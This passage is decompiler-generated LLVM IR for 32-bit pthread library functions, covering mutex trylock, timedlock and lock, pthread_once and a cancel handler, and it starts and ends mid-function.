  %v1_804f17f = add i32 %arg1, 12
  %v2_804f17f = inttoptr i32 %v1_804f17f to i32*
  %v3_804f17f = load i32, i32* %v2_804f17f, align 4
  %v1_804f182 = add i32 %v3_804f17f, -1
  %v5_804f182 = icmp eq i32 %v3_804f17f, 0
  %v9_804f182 = icmp eq i32 %v1_804f182, 0
  br i1 %v9_804f182, label %dec_label_pc_804f1ab, label %dec_label_pc_804f187

dec_label_pc_804f187:                             ; preds = %entry
  %v10_804f182 = icmp slt i32 %v1_804f182, 0
  %v6_804f182 = sub i32 0, %v3_804f17f
  %v7_804f182 = and i32 %v3_804f17f, %v6_804f182
  %v8_804f182 = icmp slt i32 %v7_804f182, 0
  %v3_804f187 = icmp eq i1 %v10_804f182, %v8_804f182
  br i1 %v3_804f187, label %dec_label_pc_804f18f, label %dec_label_pc_804f189

dec_label_pc_804f189:                             ; preds = %dec_label_pc_804f187
  br i1 %v5_804f182, label %dec_label_pc_804f1a0, label %dec_label_pc_804f199

dec_label_pc_804f18f:                             ; preds = %dec_label_pc_804f187
  %v9_804f18f = icmp eq i32 %v3_804f17f, 2
  br i1 %v9_804f18f, label %dec_label_pc_804f1d8, label %dec_label_pc_804f194

dec_label_pc_804f194:                             ; preds = %dec_label_pc_804f18f
  %v9_804f194 = icmp eq i32 %v3_804f17f, 3
  br i1 %v9_804f194, label %dec_label_pc_804f1f0, label %dec_label_pc_804f199

dec_label_pc_804f199:                             ; preds = %dec_label_pc_804f189, %dec_label_pc_804f194
  store i32 22, i32* @esi, align 4
  br label %dec_label_pc_804f1fb

dec_label_pc_804f1a0:                             ; preds = %dec_label_pc_804f189
  %v1_804f1a0 = add i32 %arg1, 16
  store i32 %v1_804f1a0, i32* @eax, align 4
  store i32 %v0_804f17a, i32* @ebx, align 4
  %v3_804f1a6 = call i32 @__pthread_trylock(i32 %v0_804f17a, i32 %v0_804f179, i32 %v0_804f178)
  %v0_804f1ab.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804f1ab

dec_label_pc_804f1ab:                             ; preds = %entry, %dec_label_pc_804f1a0
  %v0_804f1ab = phi i32 [ %v0_804f17a, %entry ], [ %v0_804f1ab.pre, %dec_label_pc_804f1a0 ]
  %v1_804f1ab = call i32 @thread_self.18(i32 %v0_804f1ab)
  %v0_804f1b0 = load i32, i32* @ebx, align 4
  %v1_804f1b0 = add i32 %v0_804f1b0, 8
  %v2_804f1b0 = inttoptr i32 %v1_804f1b0 to i32*
  %v3_804f1b0 = load i32, i32* %v2_804f1b0, align 4
  %v15_804f1b0 = icmp eq i32 %v3_804f1b0, %v1_804f1ab
  store i32 %v1_804f1ab, i32* %edi.global-to-local, align 4
  %v1_804f1b5 = icmp eq i1 %v15_804f1b0, false
  br i1 %v1_804f1b5, label %dec_label_pc_804f1be, label %dec_label_pc_804f1b7

dec_label_pc_804f1b7:                             ; preds = %dec_label_pc_804f1ab
  %v1_804f1b7 = add i32 %v0_804f1b0, 4
  %v2_804f1b7 = inttoptr i32 %v1_804f1b7 to i32*
  %v3_804f1b7 = load i32, i32* %v2_804f1b7, align 4
  %v4_804f1b7 = add i32 %v3_804f1b7, 1
  store i32 %v4_804f1b7, i32* %v2_804f1b7, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804f1fb

dec_label_pc_804f1be:                             ; preds = %dec_label_pc_804f1ab
  %v1_804f1be = add i32 %v0_804f1b0, 16
  store i32 %v1_804f1be, i32* @eax, align 4
  %v0_804f1c1 = load i32, i32* %stack_var_-12, align 4
  %v3_804f1c1 = call i32 @__pthread_trylock(i32 %v0_804f1c1, i32 %v0_804f179, i32 %v0_804f178)
  %v1_804f1c6 = icmp eq i32 %v3_804f1c1, 0
  store i32 %v3_804f1c1, i32* @esi, align 4
  %v1_804f1ca = icmp eq i1 %v1_804f1c6, false
  br i1 %v1_804f1ca, label %dec_label_pc_804f1fb, label %dec_label_pc_804f1cc

dec_label_pc_804f1cc:                             ; preds = %dec_label_pc_804f1be
  %v0_804f1cc = load i32, i32* %edi.global-to-local, align 4
  %v1_804f1cc = load i32, i32* @ebx, align 4
  %v2_804f1cc = add i32 %v1_804f1cc, 8
  %v3_804f1cc = inttoptr i32 %v2_804f1cc to i32*
  store i32 %v0_804f1cc, i32* %v3_804f1cc, align 4
  %v0_804f1cf = load i32, i32* @ebx, align 4
  %v1_804f1cf = add i32 %v0_804f1cf, 4
  %v2_804f1cf = inttoptr i32 %v1_804f1cf to i32*
  store i32 0, i32* %v2_804f1cf, align 4
  br label %dec_label_pc_804f1fb

dec_label_pc_804f1d8:                             ; preds = %dec_label_pc_804f18f
  %v1_804f1d8 = add i32 %arg1, 16
  store i32 %v1_804f1d8, i32* @eax, align 4
  %v3_804f1db = call i32 @__pthread_alt_trylock(i32 %v0_804f17a, i32 %v0_804f179, i32 %v0_804f178)
  %v1_804f1e0 = icmp eq i32 %v3_804f1db, 0
  store i32 %v3_804f1db, i32* @esi, align 4
  %v1_804f1e4 = icmp eq i1 %v1_804f1e0, false
  br i1 %v1_804f1e4, label %dec_label_pc_804f1fb, label %dec_label_pc_804f1e6

dec_label_pc_804f1e6:                             ; preds = %dec_label_pc_804f1d8
  %v0_804f1e6 = load i32, i32* %stack_var_-12, align 4
  %v1_804f1e6 = call i32 @thread_self.18(i32 %v0_804f1e6)
  %v1_804f1eb = load i32, i32* @ebx, align 4
  %v2_804f1eb = add i32 %v1_804f1eb, 8
  %v3_804f1eb = inttoptr i32 %v2_804f1eb to i32*
  store i32 %v1_804f1e6, i32* %v3_804f1eb, align 4
  br label %dec_label_pc_804f1fb

dec_label_pc_804f1f0:                             ; preds = %dec_label_pc_804f194
  %v1_804f1f0 = add i32 %arg1, 16
  store i32 %v1_804f1f0, i32* @eax, align 4
  store i32 %v0_804f17a, i32* @ebx, align 4
  %v3_804f1f6 = call i32 @__pthread_alt_trylock(i32 %v0_804f17a, i32 %v0_804f179, i32 %v0_804f178)
  br label %dec_label_pc_804f1fb

dec_label_pc_804f1fb:                             ; preds = %dec_label_pc_804f1d8, %dec_label_pc_804f1be, %dec_label_pc_804f1e6, %dec_label_pc_804f1cc, %dec_label_pc_804f1b7, %dec_label_pc_804f199, %dec_label_pc_804f1f0
  %v2_804f1fb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f1fb, i32* @ebx, align 4
  %v0_804f1fc = load i32, i32* @esi, align 4
  store i32 %v0_804f179, i32* @esi, align 4
  store i32 %v0_804f178, i32* @edi, align 4
  ret i32 %v0_804f1fc

; uselistorder directives
  uselistorder i32 %v1_804f1ab, { 1, 0 }
  uselistorder i32 %v1_804f182, { 1, 0 }
  uselistorder i32 %v3_804f17f, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_804f17a, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_804f179, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_804f178, { 0, 3, 2, 1, 4 }
  uselistorder i32* %stack_var_-12, { 3, 1, 2, 0, 4 }
  uselistorder i32 (i32, i32, i32)* @__pthread_alt_trylock, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_804f1fb, { 6, 2, 0, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_804f1ab, { 1, 0 }
  uselistorder label %dec_label_pc_804f199, { 1, 0 }
}

define i32 @pthread_mutex_timedlock(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804f203 = load i32, i32* @ebx, align 4
  store i32 %v0_804f203, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804f20c = add i32 %arg2, 4
  %v2_804f20c = inttoptr i32 %v1_804f20c to i32*
  %v3_804f20c = load i32, i32* %v2_804f20c, align 4
  %v6_804f213 = icmp ugt i32 %v3_804f20c, 999999999
  br i1 %v6_804f213, label %dec_label_pc_804f2ae, label %dec_label_pc_804f219

dec_label_pc_804f219:                             ; preds = %entry
  %v1_804f219 = add i32 %arg1, 12
  %v2_804f219 = inttoptr i32 %v1_804f219 to i32*
  %v3_804f219 = load i32, i32* %v2_804f219, align 4
  %v1_804f21c = add i32 %v3_804f219, -1
  %v5_804f21c = icmp eq i32 %v3_804f219, 0
  %v9_804f21c = icmp eq i32 %v1_804f21c, 0
  br i1 %v9_804f21c, label %dec_label_pc_804f244, label %dec_label_pc_804f221

dec_label_pc_804f221:                             ; preds = %dec_label_pc_804f219
  %v10_804f21c = icmp slt i32 %v1_804f21c, 0
  %v6_804f21c = sub i32 0, %v3_804f219
  %v7_804f21c = and i32 %v3_804f219, %v6_804f21c
  %v8_804f21c = icmp slt i32 %v7_804f21c, 0
  %v3_804f221 = icmp eq i1 %v10_804f21c, %v8_804f21c
  br i1 %v3_804f221, label %dec_label_pc_804f22c, label %dec_label_pc_804f223

dec_label_pc_804f223:                             ; preds = %dec_label_pc_804f221
  br i1 %v5_804f21c, label %dec_label_pc_804f238, label %dec_label_pc_804f2ae

dec_label_pc_804f22c:                             ; preds = %dec_label_pc_804f221
  %v9_804f22c = icmp eq i32 %v3_804f219, 2
  br i1 %v9_804f22c, label %dec_label_pc_804f26d, label %dec_label_pc_804f231

dec_label_pc_804f231:                             ; preds = %dec_label_pc_804f22c
  %v9_804f231 = icmp eq i32 %v3_804f219, 3
  %v1_804f234 = icmp eq i1 %v9_804f231, false
  br i1 %v1_804f234, label %dec_label_pc_804f2ae, label %dec_label_pc_804f296

dec_label_pc_804f238:                             ; preds = %dec_label_pc_804f223
  %v1_804f238 = add i32 %arg1, 16
  store i32 %v1_804f238, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v1_804f23d = call i32 @__pthread_lock(i32 %v0_804f203)
  br label %dec_label_pc_804f253

dec_label_pc_804f244:                             ; preds = %dec_label_pc_804f219
  %v1_804f244 = call i32 @thread_self.18(i32 %v0_804f203)
  %v0_804f249 = load i32, i32* @esi, align 4
  %v1_804f249 = add i32 %v0_804f249, 8
  %v2_804f249 = inttoptr i32 %v1_804f249 to i32*
  %v3_804f249 = load i32, i32* %v2_804f249, align 4
  %v15_804f249 = icmp eq i32 %v3_804f249, %v1_804f244
  store i32 %v1_804f244, i32* @ebx, align 4
  %v1_804f24e = icmp eq i1 %v15_804f249, false
  br i1 %v1_804f24e, label %dec_label_pc_804f257, label %dec_label_pc_804f250

dec_label_pc_804f250:                             ; preds = %dec_label_pc_804f244
  %v1_804f250 = add i32 %v0_804f249, 4
  %v2_804f250 = inttoptr i32 %v1_804f250 to i32*
  %v3_804f250 = load i32, i32* %v2_804f250, align 4
  %v4_804f250 = add i32 %v3_804f250, 1
  store i32 %v4_804f250, i32* %v2_804f250, align 4
  br label %dec_label_pc_804f253

dec_label_pc_804f253:                             ; preds = %dec_label_pc_804f291, %dec_label_pc_804f257, %dec_label_pc_804f238, %dec_label_pc_804f250
  br label %dec_label_pc_804f2ba

dec_label_pc_804f257:                             ; preds = %dec_label_pc_804f244
  %v1_804f257 = add i32 %v0_804f249, 16
  store i32 %v1_804f257, i32* @eax, align 4
  store i32 %v1_804f244, i32* @edx, align 4
  %v0_804f25c = load i32, i32* %stack_var_-12, align 4
  %v1_804f25c = call i32 @__pthread_lock(i32 %v0_804f25c)
  %v0_804f261 = load i32, i32* @ebx, align 4
  %v1_804f261 = load i32, i32* @esi, align 4
  %v2_804f261 = add i32 %v1_804f261, 8
  %v3_804f261 = inttoptr i32 %v2_804f261 to i32*
  store i32 %v0_804f261, i32* %v3_804f261, align 4
  %v0_804f264 = load i32, i32* @esi, align 4
  %v1_804f264 = add i32 %v0_804f264, 4
  %v2_804f264 = inttoptr i32 %v1_804f264 to i32*
  store i32 0, i32* %v2_804f264, align 4
  br label %dec_label_pc_804f253

dec_label_pc_804f26d:                             ; preds = %dec_label_pc_804f22c
  %v1_804f26d = call i32 @thread_self.18(i32 %v0_804f203)
  store i32 35, i32* @edx, align 4
  %v0_804f277 = load i32, i32* @esi, align 4
  %v1_804f277 = add i32 %v0_804f277, 8
  %v2_804f277 = inttoptr i32 %v1_804f277 to i32*
  %v3_804f277 = load i32, i32* %v2_804f277, align 4
  %v15_804f277 = icmp eq i32 %v3_804f277, %v1_804f26d
  store i32 %v1_804f26d, i32* @ebx, align 4
  br i1 %v15_804f277, label %dec_label_pc_804f2ba, label %dec_label_pc_804f27e

dec_label_pc_804f27e:                             ; preds = %dec_label_pc_804f26d
  %v0_804f27f = load i32, i32* @edi, align 4
  %v1_804f281 = add i32 %v0_804f277, 16
  %v4_804f285 = inttoptr i32 %v1_804f281 to i32*
  %v5_804f285 = call i32 @__pthread_alt_timedlock(i32* %v4_804f285, i32 %v1_804f26d, i32 %v0_804f27f, i32 %v1_804f26d)
  %v1_804f28d = icmp eq i32 %v5_804f285, 0
  br i1 %v1_804f28d, label %dec_label_pc_804f2b5, label %dec_label_pc_804f291

dec_label_pc_804f291:                             ; preds = %dec_label_pc_804f27e
  %v0_804f291 = load i32, i32* @ebx, align 4
  %v1_804f291 = load i32, i32* @esi, align 4
  %v2_804f291 = add i32 %v1_804f291, 8
  %v3_804f291 = inttoptr i32 %v2_804f291 to i32*
  store i32 %v0_804f291, i32* %v3_804f291, align 4
  br label %dec_label_pc_804f253

dec_label_pc_804f296:                             ; preds = %dec_label_pc_804f231
  %v0_804f296 = load i32, i32* @ecx, align 4
  %v1_804f29a = add i32 %arg1, 16
  %v4_804f29e = inttoptr i32 %v1_804f29a to i32*
  %v5_804f29e = call i32 @__pthread_alt_timedlock(i32* %v4_804f29e, i32 0, i32 %arg2, i32 %v0_804f296)
  %v1_804f2a8 = icmp eq i32 %v5_804f29e, 0
  %v1_804f2aa = icmp eq i1 %v1_804f2a8, false
  br i1 %v1_804f2aa, label %dec_label_pc_804f2ba, label %dec_label_pc_804f2b5

dec_label_pc_804f2ae:                             ; preds = %dec_label_pc_804f223, %dec_label_pc_804f231, %entry
  br label %dec_label_pc_804f2ba

dec_label_pc_804f2b5:                             ; preds = %dec_label_pc_804f296, %dec_label_pc_804f27e
  br label %dec_label_pc_804f2ba

dec_label_pc_804f2ba:                             ; preds = %dec_label_pc_804f296, %dec_label_pc_804f26d, %dec_label_pc_804f2ae, %dec_label_pc_804f253, %dec_label_pc_804f2b5
  %v0_804f2bb = phi i32 [ 0, %dec_label_pc_804f296 ], [ 35, %dec_label_pc_804f26d ], [ 22, %dec_label_pc_804f2ae ], [ 0, %dec_label_pc_804f253 ], [ 110, %dec_label_pc_804f2b5 ]
  ret i32 %v0_804f2bb

; uselistorder directives
  uselistorder i32 %v1_804f26d, { 1, 2, 3, 0 }
  uselistorder i32 %v1_804f244, { 1, 2, 0 }
  uselistorder i32 %v1_804f21c, { 1, 0 }
  uselistorder i32 %v3_804f219, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_804f203, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f2ba, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804f2ae, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f253, { 0, 1, 3, 2 }
}

define i32 @pthread_mutex_lock(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804f2c0 = load i32, i32* @esi, align 4
  %v0_804f2c1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804f2c9 = add i32 %arg1, 12
  %v2_804f2c9 = inttoptr i32 %v1_804f2c9 to i32*
  %v3_804f2c9 = load i32, i32* %v2_804f2c9, align 4
  %v1_804f2cc = add i32 %v3_804f2c9, -1
  %v5_804f2cc = icmp eq i32 %v3_804f2c9, 0
  %v9_804f2cc = icmp eq i32 %v1_804f2cc, 0
  br i1 %v9_804f2cc, label %dec_label_pc_804f2f6, label %dec_label_pc_804f2d1

dec_label_pc_804f2d1:                             ; preds = %entry
  %v10_804f2cc = icmp slt i32 %v1_804f2cc, 0
  %v6_804f2cc = sub i32 0, %v3_804f2c9
  %v7_804f2cc = and i32 %v3_804f2c9, %v6_804f2cc
  %v8_804f2cc = icmp slt i32 %v7_804f2cc, 0
  %v3_804f2d1 = icmp eq i1 %v10_804f2cc, %v8_804f2cc
  br i1 %v3_804f2d1, label %dec_label_pc_804f2d9, label %dec_label_pc_804f2d3

dec_label_pc_804f2d3:                             ; preds = %dec_label_pc_804f2d1
  br i1 %v5_804f2cc, label %dec_label_pc_804f2ea, label %dec_label_pc_804f2e3

dec_label_pc_804f2d9:                             ; preds = %dec_label_pc_804f2d1
  %v9_804f2d9 = icmp eq i32 %v3_804f2c9, 2
  br i1 %v9_804f2d9, label %dec_label_pc_804f31f, label %dec_label_pc_804f2de

dec_label_pc_804f2de:                             ; preds = %dec_label_pc_804f2d9
  %v9_804f2de = icmp eq i32 %v3_804f2c9, 3
  br i1 %v9_804f2de, label %dec_label_pc_804f341, label %dec_label_pc_804f2e3

dec_label_pc_804f2e3:                             ; preds = %dec_label_pc_804f2d3, %dec_label_pc_804f2de
  br label %dec_label_pc_804f353

dec_label_pc_804f2ea:                             ; preds = %dec_label_pc_804f2d3
  %v1_804f2ea = add i32 %arg1, 16
  store i32 %v1_804f2ea, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v1_804f2ef = call i32 @__pthread_lock(i32 %v0_804f2c1)
  br label %dec_label_pc_804f305

dec_label_pc_804f2f6:                             ; preds = %entry
  %v1_804f2f6 = call i32 @thread_self.18(i32 %v0_804f2c1)
  %v0_804f2fb = load i32, i32* @esi, align 4
  %v1_804f2fb = add i32 %v0_804f2fb, 8
  %v2_804f2fb = inttoptr i32 %v1_804f2fb to i32*
  %v3_804f2fb = load i32, i32* %v2_804f2fb, align 4
  %v15_804f2fb = icmp eq i32 %v3_804f2fb, %v1_804f2f6
  store i32 %v1_804f2f6, i32* @ebx, align 4
  %v1_804f300 = icmp eq i1 %v15_804f2fb, false
  br i1 %v1_804f300, label %dec_label_pc_804f309, label %dec_label_pc_804f302

dec_label_pc_804f302:                             ; preds = %dec_label_pc_804f2f6
  %v1_804f302 = add i32 %v0_804f2fb, 4
  %v2_804f302 = inttoptr i32 %v1_804f302 to i32*
  %v3_804f302 = load i32, i32* %v2_804f302, align 4
  %v4_804f302 = add i32 %v3_804f302, 1
  store i32 %v4_804f302, i32* %v2_804f302, align 4
  br label %dec_label_pc_804f305

dec_label_pc_804f305:                             ; preds = %dec_label_pc_804f309, %dec_label_pc_804f2ea, %dec_label_pc_804f302
  br label %dec_label_pc_804f353

dec_label_pc_804f309:                             ; preds = %dec_label_pc_804f2f6
  %v1_804f309 = add i32 %v0_804f2fb, 16
  store i32 %v1_804f309, i32* @eax, align 4
  store i32 %v1_804f2f6, i32* @edx, align 4
  %v1_804f30e = call i32 @__pthread_lock(i32 %v0_804f2c1)
  %v0_804f313 = load i32, i32* @ebx, align 4
  %v1_804f313 = load i32, i32* @esi, align 4
  %v2_804f313 = add i32 %v1_804f313, 8
  %v3_804f313 = inttoptr i32 %v2_804f313 to i32*
  store i32 %v0_804f313, i32* %v3_804f313, align 4
  %v0_804f316 = load i32, i32* @esi, align 4
  %v1_804f316 = add i32 %v0_804f316, 4
  %v2_804f316 = inttoptr i32 %v1_804f316 to i32*
  store i32 0, i32* %v2_804f316, align 4
  br label %dec_label_pc_804f305

dec_label_pc_804f31f:                             ; preds = %dec_label_pc_804f2d9
  %v1_804f31f = call i32 @thread_self.18(i32 %v0_804f2c1)
  store i32 %v1_804f31f, i32* @ebx, align 4
  %v0_804f32b = load i32, i32* @esi, align 4
  %v1_804f32b = add i32 %v0_804f32b, 8
  %v2_804f32b = inttoptr i32 %v1_804f32b to i32*
  %v3_804f32b = load i32, i32* %v2_804f32b, align 4
  %v15_804f32b = icmp eq i32 %v3_804f32b, %v1_804f31f
  br i1 %v15_804f32b, label %dec_label_pc_804f353, label %dec_label_pc_804f330

dec_label_pc_804f330:                             ; preds = %dec_label_pc_804f31f
  %v1_804f333 = add i32 %v0_804f32b, 16
  %v3_804f337 = inttoptr i32 %v1_804f333 to i32*
  %v4_804f337 = call i32 @__pthread_alt_lock(i32* %v3_804f337, i32 %v1_804f31f, i32 35)
  %v0_804f33c = load i32, i32* @ebx, align 4
  %v1_804f33c = load i32, i32* @esi, align 4
  %v2_804f33c = add i32 %v1_804f33c, 8
  %v3_804f33c = inttoptr i32 %v2_804f33c to i32*
  store i32 %v0_804f33c, i32* %v3_804f33c, align 4
  br label %dec_label_pc_804f34e

dec_label_pc_804f341:                             ; preds = %dec_label_pc_804f2de
  %v0_804f341 = load i32, i32* @ecx, align 4
  %v1_804f345 = add i32 %arg1, 16
  %v3_804f349 = inttoptr i32 %v1_804f345 to i32*
  %v4_804f349 = call i32 @__pthread_alt_lock(i32* %v3_804f349, i32 0, i32 %v0_804f341)
  br label %dec_label_pc_804f34e

dec_label_pc_804f34e:                             ; preds = %dec_label_pc_804f330, %dec_label_pc_804f341
  br label %dec_label_pc_804f353

dec_label_pc_804f353:                             ; preds = %dec_label_pc_804f31f, %dec_label_pc_804f305, %dec_label_pc_804f2e3, %dec_label_pc_804f34e
  %v0_804f356 = phi i32 [ 35, %dec_label_pc_804f31f ], [ 0, %dec_label_pc_804f305 ], [ 22, %dec_label_pc_804f2e3 ], [ 0, %dec_label_pc_804f34e ]
  %v2_804f353 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f353, i32* @edx, align 4
  store i32 %v0_804f2c1, i32* @ebx, align 4
  store i32 %v0_804f2c0, i32* @esi, align 4
  ret i32 %v0_804f356

; uselistorder directives
  uselistorder i32 %v1_804f31f, { 1, 0, 2 }
  uselistorder i32 %v1_804f2f6, { 1, 2, 0 }
  uselistorder i32 %v1_804f2cc, { 1, 0 }
  uselistorder i32 %v3_804f2c9, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_804f2c1, { 0, 3, 1, 2, 4 }
  uselistorder i32 (i32*, i32, i32)* @__pthread_alt_lock, { 1, 2, 0 }
  uselistorder i32 (i32)* @thread_self.18, { 1, 0, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804f353, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804f34e, { 1, 0 }
  uselistorder label %dec_label_pc_804f305, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f2e3, { 1, 0 }
}

define i32 @__pthread_once_fork_prepare() local_unnamed_addr {
entry:
  %v1_804f35f = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80633a8.193 to i32))
  ret i32 %v1_804f35f
}

define i32 @pthread_once(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v0_804f368 = load i32, i32* @esi, align 4
  store i32 %tmp2, i32* @esi, align 4
  %v2_804f371 = load i32, i32* %arg1, align 4
  %v11_804f371 = icmp eq i32 %v2_804f371, 2
  %v1_804f374 = icmp eq i1 %v11_804f371, false
  br i1 %v1_804f374, label %dec_label_pc_804f37b, label %dec_label_pc_804f442

dec_label_pc_804f37b:                             ; preds = %entry
  %v1_804f383 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80633a8.193 to i32))
  %v0_804f388 = load i32, i32* @esi, align 4
  %v1_804f388 = inttoptr i32 %v0_804f388 to i32*
  %v2_804f388 = load i32, i32* %v1_804f388, align 4
  %v1_804f38f = urem i32 %v2_804f388, 4
  %v8_804f392 = icmp eq i32 %v1_804f38f, 1
  %v1_804f393 = icmp eq i1 %v8_804f392, false
  br i1 %v1_804f393, label %dec_label_pc_804f3bc.preheader, label %dec_label_pc_804f395

dec_label_pc_804f395:                             ; preds = %dec_label_pc_804f37b
  %v1_804f395 = and i32 %v2_804f388, -4
  %v1_804f398 = load i32, i32* @global_var_80633cc.195, align 4
  %v12_804f398 = icmp eq i32 %v1_804f395, %v1_804f398
  br i1 %v12_804f398, label %dec_label_pc_804f3bc.preheader, label %dec_label_pc_804f3a0

dec_label_pc_804f3a0:                             ; preds = %dec_label_pc_804f395
  store i32 0, i32* %v1_804f388, align 4
  %v0_804f3bc13.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f3bc.preheader

dec_label_pc_804f3bc.preheader:                   ; preds = %dec_label_pc_804f3a0, %dec_label_pc_804f37b, %dec_label_pc_804f395
  %v0_804f3bc13 = phi i32 [ %v0_804f3bc13.pre, %dec_label_pc_804f3a0 ], [ %v0_804f388, %dec_label_pc_804f37b ], [ %v0_804f388, %dec_label_pc_804f395 ]
  %v1_804f3bc14 = inttoptr i32 %v0_804f3bc13 to i32*
  %v2_804f3bc15 = load i32, i32* %v1_804f3bc14, align 4
  %v1_804f3c016 = urem i32 %v2_804f3bc15, 4
  %v8_804f3c319 = icmp eq i32 %v1_804f3c016, 1
  br i1 %v8_804f3c319, label %dec_label_pc_804f3a8, label %dec_label_pc_804f3c6

dec_label_pc_804f3a8:                             ; preds = %dec_label_pc_804f3bc.preheader, %dec_label_pc_804f3a8
  %v0_804f3a8 = load i32, i32* @ecx, align 4
  %v4_804f3b4 = call i32 @__GI_pthread_cond_wait(i32 ptrtoint (i32* @global_var_80633c0.194 to i32), i32 ptrtoint (i32* @global_var_80633a8.193 to i32), i32 %v0_804f3a8, i32 %v0_804f3a8)
  %v0_804f3bc = load i32, i32* @esi, align 4
  %v1_804f3bc = inttoptr i32 %v0_804f3bc to i32*
  %v2_804f3bc = load i32, i32* %v1_804f3bc, align 4
  %v1_804f3c0 = urem i32 %v2_804f3bc, 4
  %v8_804f3c3 = icmp eq i32 %v1_804f3c0, 1
  br i1 %v8_804f3c3, label %dec_label_pc_804f3a8, label %dec_label_pc_804f3c6

dec_label_pc_804f3c6:                             ; preds = %dec_label_pc_804f3a8, %dec_label_pc_804f3bc.preheader
  %v1_804f3bc.lcssa = phi i32* [ %v1_804f3bc14, %dec_label_pc_804f3bc.preheader ], [ %v1_804f3bc, %dec_label_pc_804f3a8 ]
  %v2_804f3bc.lcssa = phi i32 [ %v2_804f3bc15, %dec_label_pc_804f3bc.preheader ], [ %v2_804f3bc, %dec_label_pc_804f3a8 ]
  store i32 0, i32* @ebx, align 4
  %v1_804f3c8 = icmp eq i32 %v2_804f3bc.lcssa, 0
  %v1_804f3ca = icmp eq i1 %v1_804f3c8, false
  br i1 %v1_804f3ca, label %dec_label_pc_804f41e, label %dec_label_pc_804f3cc

dec_label_pc_804f3cc:                             ; preds = %dec_label_pc_804f3c6
  %v0_804f3cc = load i32, i32* @global_var_80633cc.195, align 4
  %v1_804f3d4 = or i32 %v0_804f3cc, 1
  store i32 %v1_804f3d4, i32* %v1_804f3bc.lcssa, align 4
  %v1_804f3de = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_80633a8.193 to i32))
  %v0_804f3e6 = load i32, i32* @esi, align 4
  %v2_804f3ec = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804f3ec, i32* @ebx, align 4
  %v4_804f3f1 = call i32 @_pthread_cleanup_push(i32* nonnull %stack_var_-24, i32 134542410, i32 %v0_804f3e6)
  call void @__pseudo_call(i32 %tmp2)
  %v3_804f3ff = call i32 @_pthread_cleanup_pop(i32* nonnull %stack_var_-24, i32 0)
  %v1_804f40b = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80633a8.193 to i32))
  store i32 1, i32* @ebx, align 4
  %v0_804f418 = load i32, i32* @esi, align 4
  %v1_804f418 = inttoptr i32 %v0_804f418 to i32*
  store i32 2, i32* %v1_804f418, align 4
  br label %dec_label_pc_804f41e

dec_label_pc_804f41e:                             ; preds = %dec_label_pc_804f3c6, %dec_label_pc_804f3cc
  %v1_804f426 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_80633a8.193 to i32))
  %v0_804f42e = load i32, i32* @ebx, align 4
  %v1_804f42e = icmp eq i32 %v0_804f42e, 0
  br i1 %v1_804f42e, label %dec_label_pc_804f442, label %dec_label_pc_804f432

dec_label_pc_804f432:                             ; preds = %dec_label_pc_804f41e
  %v1_804f43a = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_80633c0.194 to i32))
  br label %dec_label_pc_804f442

dec_label_pc_804f442:                             ; preds = %entry, %dec_label_pc_804f41e, %dec_label_pc_804f432
  store i32 %v0_804f368, i32* @esi, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_804f3bc, { 1, 0 }
  uselistorder i32 %v2_804f3bc15, { 1, 0 }
  uselistorder i32 %v2_804f388, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 0 }
  uselistorder i32* @global_var_80633cc.195, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804f442, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f41e, { 1, 0 }
  uselistorder label %dec_label_pc_804f3a8, { 1, 0 }
  uselistorder label %dec_label_pc_804f3bc.preheader, { 0, 2, 1 }
}

define i32 @pthread_once_cancelhandler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804f44a = load i32, i32* @ebx, align 4
  store i32 %v0_804f44a, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804f457 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80633a8.193 to i32))
  %v0_804f45c = load i32, i32* @ebx, align 4
  %v1_804f45c = inttoptr i32 %v0_804f45c to i32*
  store i32 0, i32* %v1_804f45c, align 4
